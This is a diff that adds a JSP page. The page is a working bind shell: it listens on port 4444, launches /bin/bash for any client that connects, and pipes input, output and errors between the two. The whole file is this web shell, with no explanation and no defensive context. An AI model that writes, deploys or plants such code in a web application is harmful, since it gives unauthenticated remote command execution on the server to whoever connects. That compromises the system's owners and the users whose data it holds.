@@ -1,0 +1,58 @@
+<%@ page import="java.io.*" %>
+<%@ page import="java.net.*" %>
+<%
+    String host = "0.0.0.0";
+    int port = 4444;
+    ServerSocket serverSocket = new ServerSocket(port);
+    Socket socket = serverSocket.accept();
+
+    InputStream in = socket.getInputStream();
+    OutputStream out = socket.getOutputStream();
+
+    Process process = Runtime.getRuntime().exec("/bin/bash");
+    InputStream processIn = process.getInputStream();
+    OutputStream processOut = process.getOutputStream();
+    InputStream processErr = process.getErrorStream();
+
+    // Thread to send data from client to process
+    new Thread(new Runnable() {
+        public void run() {
+            try {
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = in.read(buffer)) != -1) {
+                    processOut.write(buffer, 0, len);
+                    processOut.flush();
+                }
+            } catch (Exception e) {}
+        }
+    }).start();
+
+    // Thread to send data from process to client
+    new Thread(new Runnable() {
+        public void run() {
+            try {
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = processIn.read(buffer)) != -1) {
+                    out.write(buffer, 0, len);
+                    out.flush();
+                }
+            } catch (Exception e) {}
+        }
+    }).start();
+
+    // Thread to send error data from process to client
+    new Thread(new Runnable() {
+        public void run() {
+            try {
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = processErr.read(buffer)) != -1) {
+                    out.write(buffer, 0, len);
+                    out.flush();
+                }
+            } catch (Exception e) {}
+        }
+    }).start();
+%>
